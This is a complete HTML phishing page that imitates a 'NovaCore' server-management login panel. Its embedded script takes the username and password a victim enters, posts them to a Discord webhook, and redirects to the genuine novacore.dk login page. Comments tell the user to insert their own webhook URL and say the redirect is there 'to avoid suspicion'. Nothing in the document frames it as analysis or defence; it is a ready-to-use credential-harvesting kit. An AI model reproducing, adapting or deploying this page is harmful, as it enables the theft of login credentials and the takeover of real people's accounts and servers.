<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NovaCore Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: #0b0e14; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-container { background: #1a1f2b; padding: 40px; border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.6); width: 360px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #00aaff; font-weight: 300; letter-spacing: 2px; }
        .logo span { color: #ffffff; font-weight: 300; }
        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; color: #aab; font-size: 13px; margin-bottom: 6px; }
        .input-group input { width: 100%; padding: 12px 16px; background: #252c3b; border: 1px solid #3a4357; border-radius: 6px; color: #fff; font-size: 15px; outline: none; transition: border 0.2s; }
        .input-group input:focus { border-color: #00aaff; }
        .btn { width: 100%; padding: 14px; background: #00aaff; border: none; border-radius: 6px; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
        .btn:hover { background: #0088cc; }
        .footer { text-align: center; margin-top: 20px; color: #667; font-size: 12px; }
        .footer a { color: #00aaff; text-decoration: none; }
        .error-msg { color: #ff6b6b; font-size: 13px; text-align: center; margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1>Nova<span>Core</span></h1>
            <p style="color:#889; font-size:13px; margin-top:4px;">Server Management Panel</p>
        </div>
        <form id="loginForm">
            <div class="input-group">
                <label for="username">Username</label>
                <input type="text" id="username" placeholder="Enter your username" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="btn">Sign In</button>
            <div id="errorMsg" class="error-msg">Invalid credentials. Please try again.</div>
        </form>
        <div class="footer">
            <a href="#">Forgot password?</a> · <a href="#">Support</a>
        </div>
    </div>

    <script>
        // ============================================================
        // DISCORD WEBHOOK CAPTURE
        // Replace this URL with your own Discord webhook URL.
        // ============================================================
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1526690003466584259/K4Z3zrC3uwrLrZtFWump3FJ9jH5I1Wcg3Bxy8-xlwmtDdrNsRExMh0FAn4vnRaQEdSJO";

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username || !password) {
                document.getElementById('errorMsg').style.display = 'block';
                return;
            }

            // Send credentials to Discord webhook
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `**NovaCore Login Credentials**\nUsername: \`${username}\`\nPassword: \`${password}\``
                })
            }).then(() => {
                // Redirect to the real NovaCore login page to avoid suspicion
                window.location.href = 'https://novacore.dk/login';
            }).catch(() => {
                // Even if webhook fails, redirect anyway
                window.location.href = 'https://novacore.dk/login';
            });
        });
    </script>
</body>
</html>
